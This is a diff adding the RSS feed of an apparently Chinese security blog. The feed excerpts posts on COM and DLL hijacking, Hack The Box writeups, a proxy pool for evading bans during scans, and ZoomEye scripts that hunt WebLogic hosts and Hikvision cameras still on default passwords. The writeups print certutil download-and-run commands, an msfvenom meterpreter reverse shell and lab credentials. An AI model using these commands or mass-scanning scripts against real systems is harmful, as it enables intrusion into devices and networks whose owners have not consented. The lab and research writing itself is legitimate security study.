@@ -1,0 +1,151 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>粉红队长</title>
+    <link>https://pink.github.io/</link>
+    <description>Recent content on 粉红队长</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
+    <lastBuildDate>Sun, 28 Feb 2021 01:39:39 +0800</lastBuildDate><atom:link href="https://pink.github.io/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>About</title>
+      <link>https://pink.github.io/about/</link>
+      <pubDate>Sun, 07 Mar 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://pink.github.io/about/</guid>
+      <description>昵称：粉红队长/Captain Pink
+Github: Captain Pink
+Email: jsdsj13@yeah.net
+欢迎各位志同道合的朋友邮件私信交流</description>
+    </item>
+    
+    <item>
+      <title>滥用COM：COM组件劫持</title>
+      <link>https://pink.github.io/posts/2021/02/%E6%BB%A5%E7%94%A8comcom%E7%BB%84%E4%BB%B6%E5%8A%AB%E6%8C%81/</link>
+      <pubDate>Sun, 28 Feb 2021 01:39:39 +0800</pubDate>
+      
+      <guid>https://pink.github.io/posts/2021/02/%E6%BB%A5%E7%94%A8comcom%E7%BB%84%E4%BB%B6%E5%8A%AB%E6%8C%81/</guid>
+      <description>COM劫持原理 COM是Component Object Model （组件对象模型）。是Windows上的一个系统，可以通过操作系统实现软件组件之间的交互。攻击者可以使用该系统，通过劫持COM引用和关系在合法软件中插入恶意代码，达成持久化目标。劫持COM对象需要修改Windows注册表，替换某个合法系统组件的引用，该操作可能导致该组件无法正常执行。当系统组件通过正常系统调用执行时，攻击者的代码就会被执行。攻击者可能会劫持频繁使用的对象，以维持一定程度的持久化驻留，但不大会破坏系统内的常见功能，避免系统出现不稳定状态导致攻击行为被发现。
+InprocServer32和LocalServer32（以及InprocServer和LocalServer）键值是COM服务（例如DLL、CPL、EXE和OCX）的引用点。一种常见的COM劫持方法是，将恶意DLL或者EXE文件放置到废弃的COM组件引用路径中。当COM组件通过正常系统调用执行时，攻击者的恶意代码就会被执行。该方法也是本文主要讨论的。
+另一种常见的方法是在程序读取注册表信息中的DLL或者EXE功能的路径上，做一个拦截，让程序提前读取我们的设置好的恶意DLL或者EXE。COM劫持原理在某种程度上近似于DLL劫持。
+Windows系统中应用程序读取COM注册表信息的顺序如下：
+HKEY_CURRENT_USER\Software\Classes\CLSID HKEY_CLASSES_ROOT\CLSID HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellCompatibility\Objects\ COM与DCOM的区别与联系 DCOM本身就是COM的一种表现形式，COM一般就把它当成在本地执行的COM，而DCOM当然就是分布的COM，在网络上的另一台计算机上执行。 关于COM与DCOM的区别与联系可以参考这篇文章，关于GUID及其与UUID、CLSID、IID的区别与联系可以参考这篇文章
+关于CLSID，LocalServer32和InprocServer32 大多数COM类是在操作系统中注册的，并由一个GUID标识，该GUID代表注册表中的类标识符（CLSID）（通常在HKLM\Software\Classes\CLSID或HKCU\Software\Classes\CLSID下）。COM类实现的背后是CLSID下注册表项内引用的“服务”（某些二进制文件）。LocalServer32项表示可执行文件（exe）的路径，而InprocServer32项表示动态链接库（DLL）的路径。
+在注册表中，CLSID结构如下所示：
+LocalServer32 InprocServer32 枚举LocalServer32/InprocServer32键并找到废弃的二进制引用 在Windows中有许多COM类，而在LocalServer32/InprocServer32的数据字段中缺少对二进制路径的引用的COM类的数量取决于一些因素，例如：
+ 操作系统版本，家族和功能； 第三方软件（已安装/卸载后）； 先前的DLL/COM注册。  要找到这些丢失的路径，请考虑以下常规步骤：
+ 枚举所有LocalServer32和InprocServer32值（路径） 标准化二进制路径以删除参数等信息 验证二进制路径是否存在并定位丢失的文件  基于该思路，我实现了一个powershell脚本，用于枚举可能存在COM劫持的LocalServer32/InprocServer32值
+实现COM劫持 我们找到了很多废弃的InprocServer32键，其中一个COM组件是优酷注册的，软件卸载之后没有移除注册表信息，于是该COM组件很有可能用于COM劫持。 目标文件并不存在，但目标目录可读可写，于是我们只需要创建相应的文件夹，并将相应的DLL文件放置于目录中。 我们构造的“恶意”DLL文件代码如下，出于演示，我们另其被成功加载时弹出计算器 我们使用rundll32直接加载恶意DLL文件，一种通过CLSID键（或PROGID）调用有效负载的方法是利用rundll32中鲜为人知的-sta（单线程单元）开关，如下所示：
+rundll32.exe -sta {CLSID} - or - rundll32.exe -sta ProgID 在我们的示例中，我们直接使用该技术来直接调用COM组件，并成功弹出计算器。 防御思考 卸载应用软件时，供应商应删除（例如注销）COM注册表工件（和磁盘工件）。此外，供应商不应创建指向不存在的二进制文件的CLSID二进制路径注册表键值。 网络防御者应监视一些有趣的主机活动，尤其是rundll32.exe的使用情况。请注意，可以使用诸如“staggg”或“staggggggggggg”之类的后缀以及CLSID成功地调用“sta”开关。 企业应实施强大的“应用白名单”（AWL）策略，并超越默认规则。
+一些关于COM滥用的参考资料 https://payloads.online/archivers/2018-10-14/1 https://cloud.tencent.com/developer/article/1498505 https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/ https://bohops.com/2018/08/18/abusing-the-com-registry-structure-part-2-loading-techniques-for-evasion-and-persistence/ https://bohops.com/2018/04/28/abusing-dcom-for-yet-another-lateral-movement-technique/ https://www.anquanke.com/post/id/159211 https://www.anquanke.com/post/id/215960 https://www.anquanke.com/post/id/217928 https://www.anquanke.com/post/id/179927 </description>
+    </item>
+    
+    <item>
+      <title>DLL劫持及其漏洞挖掘</title>
+      <link>https://pink.github.io/posts/2021/02/dll%E5%8A%AB%E6%8C%81%E5%8F%8A%E5%85%B6%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/</link>
+      <pubDate>Fri, 05 Feb 2021 23:11:55 +0800</pubDate>
+      
+      <guid>https://pink.github.io/posts/2021/02/dll%E5%8A%AB%E6%8C%81%E5%8F%8A%E5%85%B6%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/</guid>
+      <description>什么是DLL 动态链接库(Dynamic-Link-Library,缩写dll), 是微软公司在微软windows操作系统中实现共享函数库概念的一种实现方式。这些库函数的扩展名是.DLL、.OCX(包含ActiveX控制的库)或者.DRV(旧式的系统的驱动程序)
+DLL劫持一直深受黑客们的喜欢，利用此技术可以实现启动木马后门，游戏外挂插件的注入，绕过UAC等操作。
+DLL加载顺序 DLL是以文件的形式存在在硬盘中，Microsoft官方完整记录了DLL搜索顺序。
+微软的DLL劫持可以分为三个阶段：
+ 无保护阶段：Windows XP SP2之前 保护阶段：Windows XP SP2之后，Windows 7之前 进一步保护阶段：Windows 7之后  Windows XP SP2之前，DLL文件的加载顺序如下：
+ 进程对应的应用程序所在目录； 加载 DLL 时所在的当前目录； 系统目录即 SYSTEM32 目录（通过 GetSystemDirectory 获取）； 16位系统目录即 SYSTEM 目录； Windows目录（通过 GetWindowsDirectory 获取）； PATH环境变量中的各个目录；  Windows XP SP2之后：
+微软为了防止DLL劫持漏洞的产生，在XP SP2之后，添加了一个SafeDllSearchMode的注册表属性。注册表路径如下：
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\SafeDllSearchMode 当SafeDllSearchMode的值设置为1，即安全DLL搜索模式开启时（“安全DLL查找模式”默认是启用的），查找DLL的目录顺序如下：
+ 应用程序所在目录； 系统目录SYSTEM32目录； 16位系统目录即SYSTEM 目录。该项只是为了向前兼容的处理，可以不考虑； Windows目录。通常是C:\Windows； 加载 DLL 时所在的当前目录； 环境变量PATH中所有目录。需要注意的是，这里不包括App Paths注册表项指定的应用程序路径。  Windows 7之后：
+微软为了更进一步的防御系统的DLL被劫持，将一些容易被劫持的系统DLL写进了一个注册表项中，那么凡是此项下的DLL文件就会被禁止从EXE自身所在的目录下调用，而只能从系统目录即SYSTEM32目录下调用。注册表路径如下：
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs Windows 10中的KnownDLLs如下 寻找DLL劫持 劫持系统DLL 分析一个应用程序是否存在劫持系统DLL的漏洞，通常需要几个步骤：
+ 启动应用程序 使用Process Monitor等类似软件查看该应用程序启动后加载的动态链接库。 从该应用程序已经加载的DLL列表中，查找在上述“KnownDLLs注册表项”中不存在的DLL。 编写从上一步获取到的DLL的劫持DLL。 将编写好的劫持DLL放到该应用程序目录下，重新启动该应用程序，检测是否劫持成功。  如果对以上步骤都没问题还是没有实现劫持的话，具体可能有以下情况</description>
+    </item>
+    
+    <item>
+      <title>Hackthebox-Worker-Writeup</title>
+      <link>https://pink.github.io/posts/2020/12/hackthebox-worker-writeup/</link>
+      <pubDate>Sun, 27 Dec 2020 21:33:34 +0800</pubDate>
+      
+      <guid>https://pink.github.io/posts/2020/12/hackthebox-worker-writeup/</guid>
+      <description>端口扫描，只有两个开放端口80，3690 尝试使用dirsearch目录fuzz，没有找到什么有用的信息 使用nmap自带的svn暴力脚本验证登录，发现开启了匿名登录权限 SVN信息收集 其中，moved.txt中存在一个地址“http://devops.worker.htb” 先将该地址添加到“/etc/hosts”中，然后访问该地址，需要账号密码 使用“svn checkout -r 2 svn://10.10.10.203”从每个版本的仓库中寻找文件副本，并发现了deploy.ps1 打开发现用户名和密码 使用该凭证可成功登录到http://devops.worker.htb/ 在SmartHotel360-&amp;gt;Repos-&amp;gt;Files中有文件上传功能，但无法直接上传文件 需要先创建一个branch再上传文件 上传webshell，这里用了一个反向连接的Webshell 上传成功后发布一个pull请求，将shell.aspx加载到spectral.worker.htb 将spectral.worker.htb添加到hosts文件中，然后访问http://spectral.worker.htb/shell.aspx
+在本机上用nc开启监听，成功返回shell 使用winPEAS.exe扫描系统，发现了另一个系统盘
+并在其中找到账号密码robisl:wolves11 通过winrm登录，并找到user.txt
+使用新凭证登录devops.worker.htb 添加robisl到管理员组 获取root.txt 使用msf生成payload并使用前面的方式执行payload，最后获取管理员凭证。</description>
+    </item>
+    
+    <item>
+      <title>Hackthebox-Fuse-Writeup</title>
+      <link>https://pink.github.io/posts/2020/12/hackthebox-fuse-writeup/</link>
+      <pubDate>Tue, 01 Dec 2020 18:07:23 +0800</pubDate>
+      
+      <guid>https://pink.github.io/posts/2020/12/hackthebox-fuse-writeup/</guid>
+      <description>端口扫描，发现80端口开放 修改/etc/hosts 获得用户名：
+pmerton tlavel sthompson bhult administrator 保存为用户名字典文件user.txt
+生成字典
+cewl -d 5 -m 3 -w password.txt http://fuse.fabricorp.local/papercut/logs/html/index.htm --with-numbers 使用msf的smb爆破模块暴力破解 成功爆破出密码：tlavel:Fabricorp01 使用smbpasswd登录并修改密码为：Test123456 enumdomusers枚举用户 enumprinters发现密码：$fab@s3Rv1ce$1 这个密码按理说是打印机的密码，但可以远程登录windows，尝试使用前面枚举的用户名进行登录发现用户名“svc-print”登录成功 evil-winrm -u svc-print -p &amp;lsquo;$fab@s3Rv1ce$1&amp;rsquo; -i 10.10.10.193 在目录“C:\users\svc-print\Desktop”中找到user.txt 可以通过SeLoadDriverPrivilege提权，关于SeLoadDriverPrivilege提权的具体原理，文末提供了参考资料。 将相关文件放到apache目录下并开启http服务。然后下载相关文件并执行。
+certutil -urlcache -split -f http://10.10.14.46/Capcom.sys certutil -urlcache -split -f http://10.10.14.46/EoPLoadDriver.exe certutil -urlcache -split -f http://10.10.14.46/ExploitCapcom_v1.exe certutil -urlcache -split -f http://10.10.14.61/ExploitCapcom_modify.exe .\EoPLoadDriver.exe System\CurrentControlSet\MyService C:\temp\Capcom.sys .\ExploitCapcom_v1.exe 能成功提权，但需要开启一个具有system权限的shell
+msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.10.14.21 lport=8083 -f exe -o evil.exe use exploit/multi/handler set PAYLOAD windows/x64/meterpreter_reverse_tcp set lhost 10.</description>
+    </item>
+    
+    <item>
+      <title>构建简单的匿名IP代理池（一）</title>
+      <link>https://pink.github.io/posts/2018/09/%E6%9E%84%E5%BB%BA%E7%AE%80%E5%8D%95%E7%9A%84%E5%8C%BF%E5%90%8Dip%E4%BB%A3%E7%90%86%E6%B1%A0%E4%B8%80/</link>
+      <pubDate>Sun, 16 Sep 2018 18:38:19 +0000</pubDate>
+      
+      <guid>https://pink.github.io/posts/2018/09/%E6%9E%84%E5%BB%BA%E7%AE%80%E5%8D%95%E7%9A%84%E5%8C%BF%E5%90%8Dip%E4%BB%A3%E7%90%86%E6%B1%A0%E4%B8%80/</guid>
+      <description>当我们对目标网络进行漏洞扫描，或者使用sqlmap对目标网站进行注入攻击时，常常因为请求频率过高导致ip被ban，这个时候我们可以通过代理池来避免这种情况的发生，同时增加我们的隐蔽性。
+构建IP代理池首先需要获取多个可靠的代理IP，思路如下
+ 到免费的代理网站爬取代理IP 验证IP的有效性和匿名性 将有效的IP地址记录保存下来  具体实现：
+到各个ip代理网站爬取代理IP，以快代理为例，并将爬取的IP地址保存到csv文件中，主要代码如下：
+import requests from bs4 import BeautifulSoup from time import sleep import csv def kuaidaili_ip_spider(start,end): url=&#39;https://www.kuaidaili.com/free/inha/&#39; csvfile=file(&#39;kuaidaili.csv&#39;,&#39;w&#39;) print(&amp;quot;The result will be saved in kuaidaili.csv&amp;quot;) writer=csv.writer(csvfile) s = requests.session() s.keep_alive = False headers={&#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36&#39;, &#39;Connection&#39;: &#39;close&#39; } for num in xrange(start,end+1): sleep(2) print(&#39;Now downloa ing the page&#39; + str(num) + &#39; ips&#39;) try: request=requests.</description>
+    </item>
+    
+    <item>
+      <title>利用zoomeye API批量收集漏洞目标</title>
+      <link>https://pink.github.io/posts/2018/08/%E5%88%A9%E7%94%A8zoomeye-api%E6%89%B9%E9%87%8F%E6%94%B6%E9%9B%86%E6%BC%8F%E6%B4%9E%E7%9B%AE%E6%A0%87/</link>
+      <pubDate>Thu, 30 Aug 2018 15:03:17 +0000</pubDate>
+      
+      <guid>https://pink.github.io/posts/2018/08/%E5%88%A9%E7%94%A8zoomeye-api%E6%89%B9%E9%87%8F%E6%94%B6%E9%9B%86%E6%BC%8F%E6%B4%9E%E7%9B%AE%E6%A0%87/</guid>
+      <description>与上一篇 利用zoomeye API收集存在弱口令的Hikvision网络摄像头 原理相似。
+zoomeye API的使用可以参考ZoomEye API 参考手册
+这里以7月份披露的一个weblogic反序列漏洞CVE-2018-2894为例
+思路很简单：通过zoomeye api获取组件为weblogic的目标，然后再使用POC对目标进行验证，并将验证通过的目标记录下来。
+完整的python代码如下：
+scanner.py:
+#coding:utf8 import requests import threading import Queue from poc import proof def login(): username=raw_input(&amp;#34;please enter your username:&amp;#34;) password=raw_input(&amp;#34;please enter your password:&amp;#34;) login_info={ &amp;#39;username&amp;#39;:username, &amp;#39;password&amp;#39;:password } try: response=requests.post(url=&amp;#39;https://api.zoomeye.org/user/login&amp;#39;,json=login_info) access_token=response.json() return access_token except Exception as e: print(&amp;#34;[-]error:username or password might wrong, please try again&amp;#34;) exit() def search(access_token): app_name=&amp;#34;Weblogic&amp;#34; authorization = {&amp;#39;Authorization&amp;#39;: &amp;#39;JWT &amp;#39; + access_token[&amp;#34;access_token&amp;#34;]} host_queue=Queue.Queue() page_num=int(input(&amp;#34;Please enter the number of pages you need to scan:&amp;#34;)) for page in range(1,page_num+1): try: response=requests.</description>
+    </item>
+    
+    <item>
+      <title>利用zoomeye API收集存在弱口令的Hikvision网络摄像头</title>
+      <link>https://pink.github.io/posts/2018/08/%E5%88%A9%E7%94%A8zoomeye-api%E6%94%B6%E9%9B%86%E5%AD%98%E5%9C%A8%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%9A%84hikvision%E7%BD%91%E7%BB%9C%E6%91%84%E5%83%8F%E5%A4%B4/</link>
+      <pubDate>Sat, 25 Aug 2018 18:08:12 +0000</pubDate>
+      
+      <guid>https://pink.github.io/posts/2018/08/%E5%88%A9%E7%94%A8zoomeye-api%E6%94%B6%E9%9B%86%E5%AD%98%E5%9C%A8%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%9A%84hikvision%E7%BD%91%E7%BB%9C%E6%91%84%E5%83%8F%E5%A4%B4/</guid>
+      <description>通过zoomeye提供的强大的API，我们能够更好的与平台相连接，使用zoomeye平台提供的各种资源。对于zoomeye API的使用可以参考ZoomEye API 参考手册
+旧版本的海康威视网络摄像头默认账号密码为：admin/12345
+通过抓包发现认证的路径为/ISAPI/Security/userCheck，认证方式为http basic认证
+当认证成功时，响应的信息如下：
+搜集弱口令摄像头其实很简单，大概思路就是用zoomeye api获得大量Hikvision摄像头的地址,然后一个个用弱口令进行basic认证，根据响应内容判断认证是否成功，若成功证明存在弱口令，输出并将记录保存到txt文件中。
+最终做成一个交互式脚本并加入多线程增加验证速度
+完整的python代码如下：
+#coding:utf8 import sys import requests import threading import Queue def login(): username=raw_input(&amp;#34;please enter your username:&amp;#34;) password=raw_input(&amp;#34;please enter your password:&amp;#34;) login_info={ &amp;#39;username&amp;#39;:username, &amp;#39;password&amp;#39;:password } try: response=requests.post(url=&amp;#39;https://api.zoomeye.org/user/login&amp;#39;,json=login_info) access_token=response.json() return access_token except Exception as e: print(&amp;#34;[-]error:username or password might wrong, please try again&amp;#34;) exit() def search(access_token): cam_name=&amp;#34;Hikvision Network Video Recorder http admin&amp;#34; authorization = {&amp;#39;Authorization&amp;#39;: &amp;#39;JWT &amp;#39; + access_token[&amp;#34;access_token&amp;#34;]} host_queue=Queue.Queue() page_num=int(input(&amp;#34;Please enter the number of pages you need to scan:&amp;#34;)) for page in range(1,page_num+1): try: response=requests.</description>
+    </item>
+    
+    <item>
+      <title>java文件断点续传的简单实现</title>
+      <link>https://pink.github.io/posts/2018/01/java%E6%96%87%E4%BB%B6%E6%96%AD%E7%82%B9%E7%BB%AD%E4%BC%A0%E7%9A%84%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/</link>
+      <pubDate>Sat, 20 Jan 2018 18:08:12 +0000</pubDate>
+      
+      <guid>https://pink.github.io/posts/2018/01/java%E6%96%87%E4%BB%B6%E6%96%AD%E7%82%B9%E7%BB%AD%E4%BC%A0%E7%9A%84%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/</guid>
+      <description>前段时间因任务需要本人这个java渣渣开始研究如何用java实现简单的文件断点续传。所谓的文件断点续传，我的理解是文件在传输过程中因为某些原因程序停止运行文件终止传输，下一次重新传输文件的时候还能从上一次传输的位置开始传输，而不需要重新从头开始。
+文件传输的过程分为发送方和接收方，最终我的思路是这样的：
+ 传输开始之前发送方先向接收方发送一个确认信息，然后再向接收方发送准备发送的文件的文件名 接收方收到确认信息之后，接收从发送方发送过来的文件名，接收完之后向发送方发送一个确认信息表示文件名接收完毕，然后接收方根据收到的文件名创建一个“.temp”File对象和一个“.temp”RandomAccessFile对象。获取这个File对象所对应文件的长度（大小）（这个长度就是接收方已经接受的长度，如果之前没有接收过这个文件，长度就为0），并把文件长度发送给发送方。 发送方收到确认信息之后，接收接受方发送的文件长度，然后向接收方发送准备发送的文件的总长度，并向接收方发送一个确认信息。然后根据接收方发送的文件长度，从文件对应长度的位置开始发送。 接收方收到确认信息之后，接受发送方发送过来的数据，然后从此文件的末尾写入。接受完成之后再将“.temp”文件重命名为正常的文件名。  把过程画成图就是下面这样：
+“ok”表示确认信息
+能够实现断点续传的关键就是使用了RandomAccessFile，此类的实例支持对随机访问文件的读取和写入。
+加入一些如进度条、文件选择器之类的GUI，最终的主要代码如下：
+发送方线程：
+import java.awt.Color; import java.awt.Container; import java.awt.Dimension; import java.awt.FlowLayout; import java.awt.event.ActionEvent; import java.awt.event.ActionListener; import java.io.DataInputStream; import java.io.DataOutputStream; import java.io.File; import java.io.IOException; import java.io.RandomAccessFile; import java.net.Socket; import javax.swing.BoxLayout; import javax.swing.JButton; import javax.swing.JFileChooser; import javax.swing.JFrame; import javax.swing.JLabel; import javax.swing.JOptionPane; import javax.swing.JPanel; import javax.swing.JProgressBar; public class SendFileThread extends Thread{ private Socket socket=null; private DataOutputStream dos; private DataInputStream dis; private RandomAccessFile rad; private Container contentPanel; private JFrame frame; private JProgressBar progressbar; private JLabel label; public SendFileThread(){ frame=new JFrame(&amp;#34;文件传输&amp;#34;); try { socket=new Socket(&amp;#34;localhost&amp;#34;, 8080); } catch (IOException e) { // TODO Auto-generated catch block 	e.</description>
+    </item>
+    
+  </channel>
+</rss>
